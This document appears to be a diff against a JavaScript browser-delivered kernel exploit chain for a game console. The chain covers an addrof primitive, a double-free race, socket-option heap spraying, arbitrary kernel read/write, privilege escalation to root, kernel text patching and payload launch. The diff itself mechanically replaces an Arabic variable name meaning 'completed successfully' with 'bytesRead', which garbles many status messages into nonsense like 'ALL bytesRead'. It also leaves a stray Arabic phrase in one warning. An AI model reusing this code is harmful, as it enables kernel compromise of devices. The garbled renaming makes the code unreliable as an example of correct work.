@@ -587,7 +587,7 @@ function __getPatchU8(name) {
     getterCarrier[1] = targetHolder;
     getterCarrier[2] = fakeHost;
     getterCarrier[3] = targetHolder;
-    emit("ADDROF-CARRIER-تم بنجاح", "host-holder-host-holder");
+    emit("ADDROF-CARRIER-bytesRead", "host-holder-host-holder");
     preparedSymbolObject = prepareSymbolWrapper(getterCarrier);
     emit("ADDROF-WRAPPER-READY", `wait=${CAPTURE_DELAY_MS}ms`);
     setTimeout(runAddrofCapture, CAPTURE_DELAY_MS);
@@ -1492,17 +1492,17 @@ function __getPatchU8(name) {
   }
   function readInto(dest, addr, count) {
     const base = addrNumber(addr);
-    let تم بنجاح = 0;
-    while (تم بنجاح < count) {
-      const chunk = Math.min(count - تم بنجاح, carrier.windowBytes);
-      aimFor(base + تم بنجاح, chunk);
+    let bytesRead = 0;
+  while (bytesRead < count) {
+      const chunk = Math.min(count - bytesRead, carrier.windowBytes);
+      aimFor(base + bytesRead, chunk);
       try {
         for (let i = 0; i < chunk; ++i)
-          dest[تم بنجاح + i] = carrier.view[i];
+          dest[bytesRead + i] = carrier.view[i];
       } finally {
         carrier.restore();
       }
-      تم بنجاح += chunk;
+      bytesRead += chunk;
     }
     return dest;
   }
@@ -2636,7 +2636,7 @@ const html = c
   var AR3_NUM_REQS = 0;
   var AR3_REQS_LEFT = 4;
   var AR3_STATE = 8;
-  var AR3_تم بنجاح = 12;
+  var AR3_bytesRead = 12;
   var AR3_LOCK_FLAGS = 40;
   var AR3_LOCK = 56;
   var AIO_CMD_WRITE = 2;
@@ -2715,7 +2715,7 @@ const html = c
   var kLeakFp = null;
   var kv = null;
   var repaired = false;
-  var cleanupتم بنجاح = false;
+  var cleanupbytesRead = false;
   var jailbroken = false;
   var kpatched = false;
   var payloadRunning = false;
@@ -3917,7 +3917,7 @@ const html = c
         heartbeat = 0;
       }
       if (setupFail) mark("SOCKET-SETUP-FAILED", setupFail);
-      mark("RACE-تم بنجاح", attemptsUsed + " attempts in " + raceMs + " ms, detector fired " + detectorFired + " time(s): " + realFrees + " real double free(s), " + benignHits + " harmless misfire(s)");
+      mark("RACE-bytesRead", attemptsUsed + " attempts in " + raceMs + " ms, detector fired " + detectorFired + " time(s): " + realFrees + " real double free(s), " + benignHits + " harmless misfire(s)");
       if (dupSeen) mark("DUP-FDS", dupSeen + " same-fd pair(s) rejected -- closed descriptors were still listed in the socket pool");
       mark("PROBE", "walked the worker forward " + (rendezvous ? (probeTotal / rendezvous).toFixed(1) : "-") + " steps on average, worst " + probeMax + " of " + PROBE_CAP + ", " + resuspendFail + " re-suspend failures   -- pinned at the cap means raise ?probes=");
       mark("DETECTOR", STRICT_TCP ? "poll_err+tcp_state+worker_in_delete" : "poll_err+worker_in_delete (tcp_state=report-only)");
@@ -4191,7 +4191,7 @@ const html = c
             sc(SYS.aio_multi_delete, leakIds.addr.add32(o * 4), step, outs.addr);
           }
           mark("KADDRS", "evf_cv=" + evfCv + " reqs2=" + reqs2Addr + " reqs1=" + reqs1Aligned + " aio_info=" + aioInfoAddr + " target_id=" + hx(targetId) + " evf=" + hx(evf) + " dirty_fd=" + dirty);
-          mark("STAGE-2-تم بنجاح", "reqs1/reqs2/aio_info/target_id in hand");
+          mark("STAGE-2-bytesRead", "reqs1/reqs2/aio_info/target_id in hand");
           state("stage 3: crafting the aio queue entry...", "warn");
           sc(SYS.evf_delete, evf);
           mark("EVF-DELETED", hx(evf));
@@ -4242,7 +4242,7 @@ const html = c
           sprayRthdr.dv.setUint32(REQS3_OFF + AR3_NUM_REQS, 1, true);
           sprayRthdr.dv.setUint32(REQS3_OFF + AR3_REQS_LEFT, 0, true);
           sprayRthdr.dv.setUint32(REQS3_OFF + AR3_STATE, AIO_STATE_COMPLETE, true);
-          sprayRthdr.dv.setUint32(REQS3_OFF + AR3_تم بنجاح, 0, true);
+          sprayRthdr.dv.setUint32(REQS3_OFF + AR3_bytesRead, 0, true);
           sprayRthdr.dv.setUint32(REQS3_OFF + AR3_LOCK_FLAGS, 108724224, true);
           put(sprayRthdr.dv, REQS3_OFF + AR3_LOCK, new int64(1, 0));
           mark("BATCH-CRAFTED", "ar2_info=" + reqs1Aligned + " ar2_batch=" + reqs2Addr.add32(REQS3_OFF) + " ar3_state=COMPLETE");
@@ -4287,7 +4287,7 @@ const html = c
               aioIds2.dv.setUint32(abs * 4, 0, true);
               for (let k = 0; k < ipv6Socks.length; ++k) {
                 if (getRthdr(ipv6Socks[k], 128) === -1) continue;
-                if (leakRthdr.dv.getUint8(REQS3_OFF + AR3_تم بنجاح) !== 0) {
+                if (leakRthdr.dv.getUint8(REQS3_OFF + AR3_bytesRead) !== 0) {
                   dirty2 = ipv6Socks[k];
                   twinSocks.push(dirty2);
                   ipv6Socks.splice(k, 1);
@@ -4311,7 +4311,7 @@ const html = c
           if (!check(
             "crafted-aio-queue-entry-installed",
             dirty2 >= 0,
-            dirty2 >= 0 ? "" : "never observed ar3_تم بنجاح being set"
+            dirty2 >= 0 ? "" : "never observed ar3_bytesRead being set"
           ))
             return false;
           processBatches(false, true, true);
@@ -4406,7 +4406,7 @@ const html = c
           ))
             return false;
           pktoptsTwins.push(ptwins.a, ptwins.b);
-          mark("STAGE-3-تم بنجاح", "pktopts twins fds " + pktoptsTwins.join(" and ") + " alias one 0x100 allocation. make_karw is step 4i, and it is the first point where any of this can be repaired.");
+          mark("STAGE-3-bytesRead", "pktopts twins fds " + pktoptsTwins.join(" and ") + " alias one 0x100 allocation. make_karw is step 4i, and it is the first point where any of this can be repaired.");
           state("stage 4: kernel read...", "warn");
           sprayRthdr.u8.fill(0);
           const karwLen = buildRthdr(sprayRthdr, 256);
@@ -5488,7 +5488,7 @@ const html = c
                       );
                       repaired = held === 4 && cleared && leftover === 0;
                       mark(
-                        repaired ? "REPAIR-تم بنجاح" : "REPAIR-PARTIAL",
+                        repaired ? "REPAIR-bytesRead" : "REPAIR-PARTIAL",
                         repaired ? "every doubly-owned allocation now has exactly one owner. cleanup() is unlocked." : "the teardown stays locked; the reboot banner is still correct."
                       );
                       if (repaired) {
@@ -5825,7 +5825,7 @@ const html = c
                             check(
                               "gated-site-reads-0xebread back out of live kernel memory",
                               patchedOk,
-                              patchedOk ? "the kernel's own text changed under us -- that is the patch, and nothing in userland could have تم بنجاح it" : "still conditional: " + stillCond.join(" ")
+                              patchedOk ? "the kernel's own text changed under us -- that is the patch, and nothing in userland could have bytesRead it" : "still conditional: " + stillCond.join(" ")
                             );
                             kpatched = kexecRet === 0 && patchedOk && restored;
                             if (kpatched) {
@@ -6029,7 +6029,7 @@ const html = c
           } else {
             mark("FASTRW-SKIPPED", "no pipe struct addresses -- curproc was unavailable, so the ofiles walk never ran and there is nothing to aim the pipebuf at");
           }
-          mark("STAGE-5-تم بنجاح", "karw=pktopts-fd" + pktoptsTwins[0] + " kv=" + (kv ? "up" : "down"));
+          mark("STAGE-5-bytesRead", "karw=pktopts-fd" + pktoptsTwins[0] + " kv=" + (kv ? "up" : "down"));
           return true;
         }();
         check("stage 2 completed", leakOk, "");
@@ -6086,16 +6086,16 @@ const html = c
             return p.read8(impl.add32(16));
           }();
           keepAlive3.push(idBuf, idDv, outBuf);
-          let تم بنجاح = 0;
+          let bytesRead = 0;
           for (let i = 0; i < liveAioIds.length; i += AIO_MAX_NUM) {
             const step = Math.min(AIO_MAX_NUM, liveAioIds.length - i);
             for (let j = 0; j < step; ++j)
               idDv.setUint32(j * 4, liveAioIds[i + j], true);
             sc(SYS.aio_multi_poll, idAddr, step, outAddr);
             sc(SYS.aio_multi_delete, idAddr, step, outAddr);
-            تم بنجاح += step;
+            bytesRead += step;
           }
-          mark("AIO-CLEANED", تم بنجاح + " sprayed ids deleted exactly once");
+          mark("AIO-CLEANED", bytesRead + " sprayed ids deleted exactly once");
         }
       } catch (e) {
         mark("AIO-CLEANUP-FAILED", e && e.message ? e.message : String(e));
@@ -6141,7 +6141,7 @@ const html = c
             r.str === "evf cv",
             "got '" + r.str + "'"
           );
-          cleanupتم بنجاح = r.str === "evf cv";
+          cleanupbytesRead = r.str === "evf cv";
           let soak = 0;
           for (let i = 0; i < 10; ++i) {
             await new Promise(function(res) {
@@ -6156,7 +6156,7 @@ const html = c
             soak + "/10"
           );
         } else if (teardown) {
-          cleanupتم بنجاح = true;
+          cleanupbytesRead = true;
           mark("POST-CLEANUP", "no kv probe was installed, so cleanup is unproven beyond the close() return values");
         }
       } catch (e) {
@@ -6250,7 +6250,7 @@ const html = c
       } catch (e) {
         mark("EXPM1-RESTORE-FAILED", e && e.message ? e.message : String(e));
       }
-      const stillDirty = (rebootRequired || committed || committed2) && !(repaired && cleanupتم بنجاح);
+      const stillDirty = (rebootRequired || committed || committed2) && !(repaired && cleanupbytesRead);
       if (stillDirty) {
         mark("REBOOT-REQUIRED", (committed2 ? "TWO aliased pairs are live (0x80 rthdr and 0x100 pktopts). " : "") + "do not keep browsing and يرجى عدم إغلاق المتصفح أثناء عملية التثبيت. normally. power the console off and back on.");
         try {
@@ -6261,15 +6261,15 @@ const html = c
         if (!payloadRunning) {
           hostFail();
         }
-      } else if (repaired && cleanupتم بنجاح) {
+      } else if (repaired && cleanupbytesRead) {
         if (payloadRunning) {
           hostOk();
         }
         mark("SAFE-TO-EXIT", "chunkX=freed-once-by-fd" + pktoptsTwins[0] + " chunkY=leaked-0x80 pipes=+1ref-each leaks=2-pipe-pairs+0x80");
-        mark("STEP-4Q-تم بنجاح", payloadRunning ? "chain=complete leftovers=none" : kpatched ? "repaired, torn down, root, kernel patched -- but the payload did not start. It is mapped and verified; only the launch is missing." : "the corrupted context is repaired and the environment is torn down" + (jailbroken ? ", and the process is root" : "") + ". See the stage 8/9/10 marks for what is left.");
+        mark("STEP-4Q-bytesRead", payloadRunning ? "chain=complete leftovers=none" : kpatched ? "repaired, torn down, root, kernel patched -- but the payload did not start. It is mapped and verified; only the launch is missing." : "the corrupted context is repaired and the environment is torn down" + (jailbroken ? ", and the process is root" : "") + ". See the stage 8/9/10 marks for what is left.");
         hostOk();
         try {
-          stateEl.textContent = payloadRunning ? "ALL تم بنجاح" : kpatched ? "ROOT + KERNEL PATCHED -- NO REBOOT" : jailbroken ? "ROOT -- NO REBOOT NEEDED" : "REPAIRED -- NO REBOOT NEEDED";
+          stateEl.textContent = payloadRunning ? "ALL bytesRead" : kpatched ? "ROOT + KERNEL PATCHED -- NO REBOOT" : jailbroken ? "ROOT -- NO REBOOT NEEDED" : "REPAIRED -- NO REBOOT NEEDED";
           stateEl.className = "ok";
         } catch (e) {
         }
